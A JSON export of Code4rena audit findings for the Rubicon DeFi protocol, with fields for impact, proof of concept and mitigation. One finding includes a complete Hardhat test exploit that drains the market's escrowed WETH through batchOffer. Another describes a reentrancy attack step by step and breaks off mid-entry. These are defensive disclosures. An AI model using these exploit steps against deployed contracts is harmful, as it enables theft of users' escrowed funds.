it(\"Attacker taking offer\", async function () {\n+      let lastOfferId = await rubiconMarket.last_offer_id();\n+      await attackerCoin.connect(attacker).approve(\n+        rubiconMarket.address,\n+        1\n+      )\n+      await rubiconMarket.connect(attacker).buy(\n+        lastOfferId,\n+        marketWethStart.mul(10000).div(9999)\n+      );\n+    });\n+\n+    it(\"rubiconMarket holds 0 WETH\", async function () {\n+      expect(await weth.balanceOf(rubiconMarket.address)).eq(0);\n+    });\n+\n+    it(\"attacker holds 10 WETH\", async function () {\n+      expect(await weth.balanceOf(attacker.address)).eq(10n*10n**18n);\n+    });\n+  });\n+\n   describe(\"Protocol Tests\", async function () {\n     // *** Core ***\n     describe(\"Rubicon Market\", function () {\n```\n\n## Mitigation\n\nChange `this.offer` to `offer`. As the `offer` function is currently `external`, it will have to be changed to `public`.",
      "description": null,
      "impact": "## Impact\n\nAn attacker can use this to make `RubiconMarket` offer all its balance of a particular token (possibly in exchange for a token the attacker created, so at effectively zero cost), with the attacker then taking the offer and thereby stealing `RubiconMarket`'s entire balance in that token.\n\nFor this attack to work, the `RubiconMarket` must be able to actually make the offer itself, and the crucial condition here is that [line 538](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L538)\n```Solidity\nrequire(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n```\nin the `offer` function of `SimpleMarket` must not revert if this call is made by the `RubiconMarket` contract and `msg.sender` is *also* that same contract, even though `RubiconMarket` did not approve a transfer to itself.\nWhether this condition is satisfied depends on the token.\nFor example in the [standard ERC20 token contract by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol), this condition is not satisfied.\n\nHowever, in the [WETH contract](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000006#code), the check in the `transferFrom` function is\n```Solidity\nif (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n    require(allowance[src][msg.sender] >= wad);\n    allowance[src][msg.sender] -= wad;\n}\n```\nso if the caller is also the `src`, then it is not necessary to approve the transfer beforehand. This means the vulnerability outlined above can be used to drain all WETH held by a `RubiconMarket`, and possibly the balance in other tokens where `transferFrom` is implemented similarly.\n",
      "mitigation": "## Mitigation\n\nChange `this.offer` to `offer`. As the `offer` function is currently `external`, it will have to be changed to `public`.\n",
      "poc": "## Proof of Concept\n\nAfter applying the diff below, run\n```\nnpx hardhat test --grep \"ShalaamumMarketThis\"\n```\nto run the POC. The output should contain the following.\n```\n  Rubicon v2 Protocol Tests\n    ShalaamumMarketThis\n      âœ“ Initialized Market\n      âœ“ attacker has 1 ETH and 0 WETH\n      âœ“ attacker deploys own attackerCoin\n      âœ“ rubiconMarket holds 10 WETH\n      âœ“ Attacker exploiting vulnerability and making market offer assets held in escrow\n      âœ“ Attacker taking offer\n      âœ“ rubiconMarket holds 0 WETH\n      âœ“ attacker holds 10 WETH\n```\n\nThe POC demonstrates how an attacker can deploy their own token and then use `batchOffer` to make the `RubiconMarket` offer its entire balance of WETH for some of the attacker's token. The attacker then takes that offer at no cost (except some gas) and thereby steals the `10 WETH` the `RubiconMarket` held in escrow for previous unfilled offers.\n\n\n### Files to change\n\nApply the following diff to `test/hardhat-tests/ProtocolDeployment.ts`:\n```diff\ndiff --git a/test/hardhat-tests/ProtocolDeployment.ts b/test/hardhat-tests/ProtocolDeployment.ts\nindex b55d879..0b8e6ba 100644\n--- a/test/hardhat-tests/ProtocolDeployment.ts\n+++ b/test/hardhat-tests/ProtocolDeployment.ts\n@@ -1,4 +1,4 @@\n-import { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\n+import { time, loadFixture, setBalance } from \"@nomicfoundation/hardhat-network-helpers\";\n import { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\n import { expect } from \"chai\";\n import { ethers, network } from \"hardhat\";\n@@ -213,6 +213,77 @@ describe(\"Rubicon v2 Protocol Tests\", function () {\n     };\n   }\n\n+  describe(\"ShalaamumMarketThis\", function () {\n+    let rubiconMarket, weth, attacker;\n+    let attackerCoin;\n+    const attackerBalanceStart = 10n**18n;\n+    let marketWethStart;\n+\n+    before(async function () {\n+      let otherAccount;\n+      ({ rubiconMarket, weth, otherAccount } = await loadFixture(\n+        deployRubiconProtocolFixture\n+      ));\n+      attacker = otherAccount;\n+    });\n+\n+    it(\"Initialized Market\", async function () {\n+      expect(await rubiconMarket.initialized()).to.equal(true);\n+    });\n+\n+    it(\"attacker has 1 ETH and 0 WETH\", async function () {\n+      setBalance(attacker.address, attackerBalanceStart);\n+      expect(await ethers.provider.getBalance(attacker.address)).eq(attackerBalanceStart);\n+      expect(await weth.balanceOf(attacker.address)).eq(0);\n+    });\n+\n+    it(\"attacker deploys own attackerCoin\", async function () {\n+      const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\", attacker);\n+      attackerCoin = await testCoinFactory.deploy(\n+        attacker.address,\n+        \"AttackerCoin\",\n+        \"ATTACKCOIN\",\n+        18\n+      );\n+      await attackerCoin.connect(attacker).adminMint();\n+      expect(await attackerCoin.balanceOf(attacker.address)).to.be.gte(1);\n+    });\n+\n+    it(\"rubiconMarket holds 10 WETH\", async function () {\n+      marketWethStart = await weth.balanceOf(rubiconMarket.address);\n+      expect(marketWethStart).eq(10n*10n**18n);\n+    });\n+\n+    it(\"Attacker exploiting vulnerability and causing market to offer assets held in escrow\", async function () {\n+      await rubiconMarket.connect(attacker).batchOffer(\n+        [marketWethStart],\n+        [weth.address],\n+        [1],\n+        [attackerCoin.address]\n+      );\n+    });\n+\n+    it(\"Attacker taking offer\", async function () {\n+      let lastOfferId = await rubiconMarket.last_offer_id();\n+      await attackerCoin.connect(attacker).approve(\n+        rubiconMarket.address,\n+        1\n+      )\n+      await rubiconMarket.connect(attacker).buy(\n+        lastOfferId,\n+        marketWethStart.mul(10000).div(9999)\n+      );\n+    });\n+\n+    it(\"rubiconMarket holds 0 WETH\", async function () {\n+      expect(await weth.balanceOf(rubiconMarket.address)).eq(0);\n+    });\n+\n+    it(\"attacker holds 10 WETH\", async function () {\n+      expect(await weth.balanceOf(attacker.address)).eq(10n*10n**18n);\n+    });\n+  });\n+\n   describe(\"Protocol Tests\", async function () {\n     // *** Core ***\n     describe(\"Rubicon Market\", function () {\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L900\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L926\n\n**container:**\n# Vulnerability details\n\nThe `RubiconMarket` functions `batchOffer` and `batchRequote` both contain calls to `offer` as follows.\n```Solidity\nthis.offer(\n    payAmts[i],\n    ERC20(payGems[i]),\n    buyAmts[i],\n    ERC20(buyGems[i])\n);\n```\nBut calling `offer` using `this.offer` will [use a message call instead of a jump](https://docs.soliditylang.org/en/v0.8.19/control-structures.html#function-calls).\nThis means that in `offer`, the value of `msg.sender` will be the address of the `RubiconMarket` contract, not of the original sender. Hence the offer will be made by the `RubiconMarket` itself.\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nAn attacker can use this to make `RubiconMarket` offer all its balance of a particular token (possibly in exchange for a token the attacker created, so at effectively zero cost), with the attacker then taking the offer and thereby stealing `RubiconMarket`'s entire balance in that token.\n\nFor this attack to work, the `RubiconMarket` must be able to actually make the offer itself, and the crucial condition here is that [line 538](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L538)\n```Solidity\nrequire(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n```\nin the `offer` function of `SimpleMarket` must not revert if this call is made by the `RubiconMarket` contract and `msg.sender` is *also* that same contract, even though `RubiconMarket` did not approve a transfer to itself.\nWhether this condition is satisfied depends on the token.\nFor example in the [standard ERC20 token contract by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol), this condition is not satisfied.\n\nHowever, in the [WETH contract](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000006#code), the check in the `transferFrom` function is\n```Solidity\nif (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n    require(allowance[src][msg.sender] >= wad);\n    allowance[src][msg.sender] -= wad;\n}\n```\nso if the caller is also the `src`, then it is not necessary to approve the transfer beforehand. This means the vulnerability outlined above can be used to drain all WETH held by a `RubiconMarket`, and possibly the balance in other tokens where `transferFrom` is implemented similarly.\n",
        "recommendation": "## Mitigation\n\nChange `this.offer` to `offer`. As the `offer` function is currently `external`, it will have to be changed to `public`.\n",
        "poc": "## Proof of Concept\n\nAfter applying the diff below, run\n```\nnpx hardhat test --grep \"ShalaamumMarketThis\"\n```\nto run the POC. The output should contain the following.\n```\n  Rubicon v2 Protocol Tests\n    ShalaamumMarketThis\n      âœ“ Initialized Market\n      âœ“ attacker has 1 ETH and 0 WETH\n      âœ“ attacker deploys own attackerCoin\n      âœ“ rubiconMarket holds 10 WETH\n      âœ“ Attacker exploiting vulnerability and making market offer assets held in escrow\n      âœ“ Attacker taking offer\n      âœ“ rubiconMarket holds 0 WETH\n      âœ“ attacker holds 10 WETH\n```\n\nThe POC demonstrates how an attacker can deploy their own token and then use `batchOffer` to make the `RubiconMarket` offer its entire balance of WETH for some of the attacker's token. The attacker then takes that offer at no cost (except some gas) and thereby steals the `10 WETH` the `RubiconMarket` held in escrow for previous unfilled offers.\n\n\n### Files to change\n\nApply the following diff to `test/hardhat-tests/ProtocolDeployment.ts`:\n```diff\ndiff --git a/test/hardhat-tests/ProtocolDeployment.ts b/test/hardhat-tests/ProtocolDeployment.ts\nindex b55d879..0b8e6ba 100644\n--- a/test/hardhat-tests/ProtocolDeployment.ts\n+++ b/test/hardhat-tests/ProtocolDeployment.ts\n@@ -1,4 +1,4 @@\n-import { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\n+import { time, loadFixture, setBalance } from \"@nomicfoundation/hardhat-network-helpers\";\n import { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\n import { expect } from \"chai\";\n import { ethers, network } from \"hardhat\";\n@@ -213,6 +213,77 @@ describe(\"Rubicon v2 Protocol Tests\", function () {\n     };\n   }\n\n+  describe(\"ShalaamumMarketThis\", function () {\n+    let rubiconMarket, weth, attacker;\n+    let attackerCoin;\n+    const attackerBalanceStart = 10n**18n;\n+    let marketWethStart;\n+\n+    before(async function () {\n+      let otherAccount;\n+      ({ rubiconMarket, weth, otherAccount } = await loadFixture(\n+        deployRubiconProtocolFixture\n+      ));\n+      attacker = otherAccount;\n+    });\n+\n+    it(\"Initialized Market\", async function () {\n+      expect(await rubiconMarket.initialized()).to.equal(true);\n+    });\n+\n+    it(\"attacker has 1 ETH and 0 WETH\", async function () {\n+      setBalance(attacker.address, attackerBalanceStart);\n+      expect(await ethers.provider.getBalance(attacker.address)).eq(attackerBalanceStart);\n+      expect(await weth.balanceOf(attacker.address)).eq(0);\n+    });\n+\n+    it(\"attacker deploys own attackerCoin\", async function () {\n+      const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\", attacker);\n+      attackerCoin = await testCoinFactory.deploy(\n+        attacker.address,\n+        \"AttackerCoin\",\n+        \"ATTACKCOIN\",\n+        18\n+      );\n+      await attackerCoin.connect(attacker).adminMint();\n+      expect(await attackerCoin.balanceOf(attacker.address)).to.be.gte(1);\n+    });\n+\n+    it(\"rubiconMarket holds 10 WETH\", async function () {\n+      marketWethStart = await weth.balanceOf(rubiconMarket.address);\n+      expect(marketWethStart).eq(10n*10n**18n);\n+    });\n+\n+    it(\"Attacker exploiting vulnerability and causing market to offer assets held in escrow\", async function () {\n+      await rubiconMarket.connect(attacker).batchOffer(\n+        [marketWethStart],\n+        [weth.address],\n+        [1],\n+        [attackerCoin.address]\n+      );\n+    });\n+\n+    it(\"Attacker taking offer\", async function () {\n+      let lastOfferId = await rubiconMarket.last_offer_id();\n+      await attackerCoin.connect(attacker).approve(\n+        rubiconMarket.address,\n+        1\n+      )\n+      await rubiconMarket.connect(attacker).buy(\n+        lastOfferId,\n+        marketWethStart.mul(10000).div(9999)\n+      );\n+    });\n+\n+    it(\"rubiconMarket holds 0 WETH\", async function () {\n+      expect(await weth.balanceOf(rubiconMarket.address)).eq(0);\n+    });\n+\n+    it(\"attacker holds 10 WETH\", async function () {\n+      expect(await weth.balanceOf(attacker.address)).eq(10n*10n**18n);\n+    });\n+  });\n+\n   describe(\"Protocol Tests\", async function () {\n     // *** Core ***\n     describe(\"Rubicon Market\", function () {\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L900\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L926\n\n**container:**\n# Vulnerability details\n\nThe `RubiconMarket` functions `batchOffer` and `batchRequote` both contain calls to `offer` as follows.\n```Solidity\nthis.offer(\n    payAmts[i],\n    ERC20(payGems[i]),\n    buyAmts[i],\n    ERC20(buyGems[i])\n);\n```\nBut calling `offer` using `this.offer` will [use a message call instead of a jump](https://docs.soliditylang.org/en/v0.8.19/control-structures.html#function-calls).\nThis means that in `offer`, the value of `msg.sender` will be the address of the `RubiconMarket` contract, not of the original sender. Hence the offer will be made by the `RubiconMarket` itself.\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L900\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L926\n\n\n# Vulnerability details\n\nThe `RubiconMarket` functions `batchOffer` and `batchRequote` both contain calls to `offer` as follows.\n```Solidity\nthis.offer(\n    payAmts[i],\n    ERC20(payGems[i]),\n    buyAmts[i],\n    ERC20(buyGems[i])\n);\n```\nBut calling `offer` using `this.offer` will [use a message call instead of a jump](https://docs.soliditylang.org/en/v0.8.19/control-structures.html#function-calls).\nThis means that in `offer`, the value of `msg.sender` will be the address of the `RubiconMarket` contract, not of the original sender. Hence the offer will be made by the `RubiconMarket` itself.\n\n\n## Impact\n\nAn attacker can use this to make `RubiconMarket` offer all its balance of a particular token (possibly in exchange for a token the attacker created, so at effectively zero cost), with the attacker then taking the offer and thereby stealing `RubiconMarket`'s entire balance in that token.\n\nFor this attack to work, the `RubiconMarket` must be able to actually make the offer itself, and the crucial condition here is that [line 538](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L538)\n```Solidity\nrequire(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n```\nin the `offer` function of `SimpleMarket` must not revert if this call is made by the `RubiconMarket` contract and `msg.sender` is *also* that same contract, even though `RubiconMarket` did not approve a transfer to itself.\nWhether this condition is satisfied depends on the token.\nFor example in the [standard ERC20 token contract by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol), this condition is not satisfied.\n\nHowever, in the [WETH contract](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000006#code), the check in the `transferFrom` function is\n```Solidity\nif (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n    require(allowance[src][msg.sender] >= wad);\n    allowance[src][msg.sender] -= wad;\n}\n```\nso if the caller is also the `src`, then it is not necessary to approve the transfer beforehand. This means the vulnerability outlined above can be used to drain all WETH held by a `RubiconMarket`, and possibly the balance in other tokens where `transferFrom` is implemented similarly.\n\n\n## Proof of Concept\n\nAfter applying the diff below, run\n```\nnpx hardhat test --grep \"ShalaamumMarketThis\"\n```\nto run the POC. The output should contain the following.\n```\n  Rubicon v2 Protocol Tests\n    ShalaamumMarketThis\n      âœ“ Initialized Market\n      âœ“ attacker has 1 ETH and 0 WETH\n      âœ“ attacker deploys own attackerCoin\n      âœ“ rubiconMarket holds 10 WETH\n      âœ“ Attacker exploiting vulnerability and making market offer assets held in escrow\n      âœ“ Attacker taking offer\n      âœ“ rubiconMarket holds 0 WETH\n      âœ“ attacker holds 10 WETH\n```\n\nThe POC demonstrates how an attacker can deploy their own token and then use `batchOffer` to make the `RubiconMarket` offer its entire balance of WETH for some of the attacker's token. The attacker then takes that offer at no cost (except some gas) and thereby steals the `10 WETH` the `RubiconMarket` held in escrow for previous unfilled offers.\n\n\n### Files to change\n\nApply the following diff to `test/hardhat-tests/ProtocolDeployment.ts`:\n```diff\ndiff --git a/test/hardhat-tests/ProtocolDeployment.ts b/test/hardhat-tests/ProtocolDeployment.ts\nindex b55d879..0b8e6ba 100644\n--- a/test/hardhat-tests/ProtocolDeployment.ts\n+++ b/test/hardhat-tests/ProtocolDeployment.ts\n@@ -1,4 +1,4 @@\n-import { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\n+import { time, loadFixture, setBalance } from \"@nomicfoundation/hardhat-network-helpers\";\n import { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\n import { expect } from \"chai\";\n import { ethers, network } from \"hardhat\";\n@@ -213,6 +213,77 @@ describe(\"Rubicon v2 Protocol Tests\", function () {\n     };\n   }\n\n+  describe(\"ShalaamumMarketThis\", function () {\n+    let rubiconMarket, weth, attacker;\n+    let attackerCoin;\n+    const attackerBalanceStart = 10n**18n;\n+    let marketWethStart;\n+\n+    before(async function () {\n+      let otherAccount;\n+      ({ rubiconMarket, weth, otherAccount } = await loadFixture(\n+        deployRubiconProtocolFixture\n+      ));\n+      attacker = otherAccount;\n+    });\n+\n+    it(\"Initialized Market\", async function () {\n+      expect(await rubiconMarket.initialized()).to.equal(true);\n+    });\n+\n+    it(\"attacker has 1 ETH and 0 WETH\", async function () {\n+      setBalance(attacker.address, attackerBalanceStart);\n+      expect(await ethers.provider.getBalance(attacker.address)).eq(attackerBalanceStart);\n+      expect(await weth.balanceOf(attacker.address)).eq(0);\n+    });\n+\n+    it(\"attacker deploys own attackerCoin\", async function () {\n+      const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\", attacker);\n+      attackerCoin = await testCoinFactory.deploy(\n+        attacker.address,\n+        \"AttackerCoin\",\n+        \"ATTACKCOIN\",\n+        18\n+      );\n+      await attackerCoin.connect(attacker).adminMint();\n+      expect(await attackerCoin.balanceOf(attacker.address)).to.be.gte(1);\n+    });\n+\n+    it(\"rubiconMarket holds 10 WETH\", async function () {\n+      marketWethStart = await weth.balanceOf(rubiconMarket.address);\n+      expect(marketWethStart).eq(10n*10n**18n);\n+    });\n+\n+    it(\"Attacker exploiting vulnerability and causing market to offer assets held in escrow\", async function () {\n+      await rubiconMarket.connect(attacker).batchOffer(\n+        [marketWethStart],\n+        [weth.address],\n+        [1],\n+        [attackerCoin.address]\n+      );\n+    });\n+\n+    it(\"Attacker taking offer\", async function () {\n+      let lastOfferId = await rubiconMarket.last_offer_id();\n+      await attackerCoin.connect(attacker).approve(\n+        rubiconMarket.address,\n+        1\n+      )\n+      await rubiconMarket.connect(attacker).buy(\n+        lastOfferId,\n+        marketWethStart.mul(10000).div(9999)\n+      );\n+    });\n+\n+    it(\"rubiconMarket holds 0 WETH\", async function () {\n+      expect(await weth.balanceOf(rubiconMarket.address)).eq(0);\n+    });\n+\n+    it(\"attacker holds 10 WETH\", async function () {\n+      expect(await weth.balanceOf(attacker.address)).eq(10n*10n**18n);\n+    });\n+  });\n+\n   describe(\"Protocol Tests\", async function () {\n     // *** Core ***\n     describe(\"Rubicon Market\", function () {\n```\n\n## Mitigation\n\nChange `this.offer` to `offer`. As the `offer` function is currently `external`, it will have to be changed to `public`.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1141,
      "page_start": null,
      "heading": "1141. Use of `block.number` leads to incorrect interest calculations",
      "heading_cleaned": "Use of `block.number` leads to incorrect interest calculations",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L327\n\n\n# Vulnerability details\n\n\n\n\nThe interests that need to be paid upon closing a position are computed as follows:\n\n```solidity\nFile: contracts/utilities/poolsUtility/Position.sol\n322: function _calculateDebt(\n323:         address _bathToken,\n324:         uint256 _startBlock,\n325:         uint256 _borrowedAmount\n326:     ) internal view returns (uint256 _debt) {\n327:         uint256 _blockDelta = block.number - _startBlock;\n328:\n329:         uint256 _interest = (\n330:             (_borrowedAmount).mul(borrowRate(_bathToken).mul(_blockDelta))\n331:         ).div(10 ** 18);\n332:         _debt = _borrowedAmount.add(_interest);\n333:     }\n```\n\nThe interest rate is computed using the block delta, between `block.number` and the starting block.\n\nThe issue is that block production on Optimism is currently [not fixed](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps):\n\n```\neach transaction on L2 is placed in a separate block and blocks are NOT produced at a constant rate\n```\n\n## Proof of Concept\n\nRun the following command several times in the repo, using an optimism rpc url:\n\n```sh\ncast block-number --rpc-url YOUR_OPTIMISM_RPC_URL\n```\n\nYou will see that block are not produced at a constant rate.\n\n\n## Impact\n\nInterest rates are currently manipulable and will result in users having to repay more interests than expected upon closing positions.\n\n\n## Tools Used\n\nManual Analysis\n\n\n## Mitigation\n\nUse `block.timestamp` instead of `block.number` for interest calculation. It will involve a lot of refactoring as the `Compound` contracts `bathToken` currently inherits from use a \"per block\" system.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L327\n\n\n# Vulnerability details\n\n\n\n\nThe interests that need to be paid upon closing a position are computed as follows:\n\n```solidity\nFile: contracts/utilities/poolsUtility/Position.sol\n322: function _calculateDebt(\n323:         address _bathToken,\n324:         uint256 _startBlock,\n325:         uint256 _borrowedAmount\n326:     ) internal view returns (uint256 _debt) {\n327:         uint256 _blockDelta = block.number - _startBlock;\n328: \n329:         uint256 _interest = (\n330:             (_borrowedAmount).mul(borrowRate(_bathToken).mul(_blockDelta))\n331:         ).div(10 ** 18);\n332:         _debt = _borrowedAmount.add(_interest);\n333:     }\n```\n\nThe interest rate is computed using the block delta, between `block.number` and the starting block.\n\nThe issue is that block production on Optimism is currently [not fixed](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps):\n\n```\neach transaction on L2 is placed in a separate block and blocks are NOT produced at a constant rate\n```\n\n## Proof of Concept\n\nRun the following command several times in the repo, using an optimism rpc url:\n\n```sh\ncast block-number --rpc-url YOUR_OPTIMISM_RPC_URL\n```\n\nYou will see that block are not produced at a constant rate.\n\n\n## Impact\n\nInterest rates are currently manipulable and will result in users having to repay more interests than expected upon closing positions.\n\n\n## Tools Used\n\nManual Analysis\n\n\n## Mitigation\n\nUse `block.timestamp` instead of `block.number` for interest calculation. It will involve a lot of refactoring as the `Compound` contracts `bathToken` currently inherits from use a \"per block\" system.",
      "description": null,
      "impact": "## Impact\n\nInterest rates are currently manipulable and will result in users having to repay more interests than expected upon closing positions.\n",
      "mitigation": "## Mitigation\n\nUse `block.timestamp` instead of `block.number` for interest calculation. It will involve a lot of refactoring as the `Compound` contracts `bathToken` currently inherits from use a \"per block\" system.\n",
      "poc": "## Proof of Concept\n\nRun the following command several times in the repo, using an optimism rpc url:\n\n```sh\ncast block-number --rpc-url YOUR_OPTIMISM_RPC_URL\n```\n\nYou will see that block are not produced at a constant rate.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L327\n\n**container:**\n# Vulnerability details\n\n\n\n\nThe interests that need to be paid upon closing a position are computed as follows:\n\n```solidity\nFile: contracts/utilities/poolsUtility/Position.sol\n322: function _calculateDebt(\n323:         address _bathToken,\n324:         uint256 _startBlock,\n325:         uint256 _borrowedAmount\n326:     ) internal view returns (uint256 _debt) {\n327:         uint256 _blockDelta = block.number - _startBlock;\n328:\n329:         uint256 _interest = (\n330:             (_borrowedAmount).mul(borrowRate(_bathToken).mul(_blockDelta))\n331:         ).div(10 ** 18);\n332:         _debt = _borrowedAmount.add(_interest);\n333:     }\n```\n\nThe interest rate is computed using the block delta, between `block.number` and the starting block.\n\nThe issue is that block production on Optimism is currently [not fixed](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps):\n\n```\neach transaction on L2 is placed in a separate block and blocks are NOT produced at a constant rate\n```\n\n**tools_used:**\n## Tools Used\n\nManual Analysis\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nInterest rates are currently manipulable and will result in users having to repay more interests than expected upon closing positions.\n",
        "recommendation": "## Mitigation\n\nUse `block.timestamp` instead of `block.number` for interest calculation. It will involve a lot of refactoring as the `Compound` contracts `bathToken` currently inherits from use a \"per block\" system.\n",
        "poc": "## Proof of Concept\n\nRun the following command several times in the repo, using an optimism rpc url:\n\n```sh\ncast block-number --rpc-url YOUR_OPTIMISM_RPC_URL\n```\n\nYou will see that block are not produced at a constant rate.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L327\n\n**container:**\n# Vulnerability details\n\n\n\n\nThe interests that need to be paid upon closing a position are computed as follows:\n\n```solidity\nFile: contracts/utilities/poolsUtility/Position.sol\n322: function _calculateDebt(\n323:         address _bathToken,\n324:         uint256 _startBlock,\n325:         uint256 _borrowedAmount\n326:     ) internal view returns (uint256 _debt) {\n327:         uint256 _blockDelta = block.number - _startBlock;\n328:\n329:         uint256 _interest = (\n330:             (_borrowedAmount).mul(borrowRate(_bathToken).mul(_blockDelta))\n331:         ).div(10 ** 18);\n332:         _debt = _borrowedAmount.add(_interest);\n333:     }\n```\n\nThe interest rate is computed using the block delta, between `block.number` and the starting block.\n\nThe issue is that block production on Optimism is currently [not fixed](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps):\n\n```\neach transaction on L2 is placed in a separate block and blocks are NOT produced at a constant rate\n```\n\n**tools_used:**\n## Tools Used\n\nManual Analysis\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L327\n\n\n# Vulnerability details\n\n\n\n\nThe interests that need to be paid upon closing a position are computed as follows:\n\n```solidity\nFile: contracts/utilities/poolsUtility/Position.sol\n322: function _calculateDebt(\n323:         address _bathToken,\n324:         uint256 _startBlock,\n325:         uint256 _borrowedAmount\n326:     ) internal view returns (uint256 _debt) {\n327:         uint256 _blockDelta = block.number - _startBlock;\n328:\n329:         uint256 _interest = (\n330:             (_borrowedAmount).mul(borrowRate(_bathToken).mul(_blockDelta))\n331:         ).div(10 ** 18);\n332:         _debt = _borrowedAmount.add(_interest);\n333:     }\n```\n\nThe interest rate is computed using the block delta, between `block.number` and the starting block.\n\nThe issue is that block production on Optimism is currently [not fixed](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps):\n\n```\neach transaction on L2 is placed in a separate block and blocks are NOT produced at a constant rate\n```\n\n## Proof of Concept\n\nRun the following command several times in the repo, using an optimism rpc url:\n\n```sh\ncast block-number --rpc-url YOUR_OPTIMISM_RPC_URL\n```\n\nYou will see that block are not produced at a constant rate.\n\n\n## Impact\n\nInterest rates are currently manipulable and will result in users having to repay more interests than expected upon closing positions.\n\n\n## Tools Used\n\nManual Analysis\n\n\n## Mitigation\n\nUse `block.timestamp` instead of `block.number` for interest calculation. It will involve a lot of refactoring as the `Compound` contracts `bathToken` currently inherits from use a \"per block\" system.\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1166,
      "page_start": null,
      "heading": "1166. REENTRANCY ATTACK POSSIBLE IF THE `_feeTo` IS A MALICIOUS CONTRACT IN `FeeWrapper._chargeFeePayable()` FUNCTION",
      "heading_cleaned": "REENTRANCY ATTACK POSSIBLE IF THE `_feeTo` IS A MALICIOUS CONTRACT IN `FeeWrapper._chargeFeePayable()` FUNCTION",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n\n# Vulnerability details\n\n## Impact\n\nReentrancy attack could happen if `_feeTo` is a `malicious` contract and has `recieve()` function implemented in `_feeTo` contract. `FeeWrapper._chargeFeePayable()` function is used to send the `_feeAmount` of Eth to the `_feeTo` address.\n\nConsider that `FeeWrapper._chargeFeePayable()` is called by the `FeeWrapper._rubicallPayable()` function with the necessary `_feeParams` input parameter, and the following scenario can occur:\n\n1 . The call to (bool OK, ) = `payable(_feeTo)`.call{value: _feeAmount}(\"\") is made. Lets assume the _totalAmount = 1Eth and _feeAmount = 0.1Eth initially.\n2 . `_feeTo` contract has `recieve()` function implemented in it.\n3 . It reenters the `FeeWrapper` contract by calling the `rubicallPayable()` function by sending `0.01Eth` as msg.value.\n4 . Sets the `_feeParams.totalAmount =  0.01Eth` and `_feeParams.feeAmount = 0.1Eth` in the call to `rubicallPayable()`\n5 . `FeeWrapper.chargeFeePayable()` will 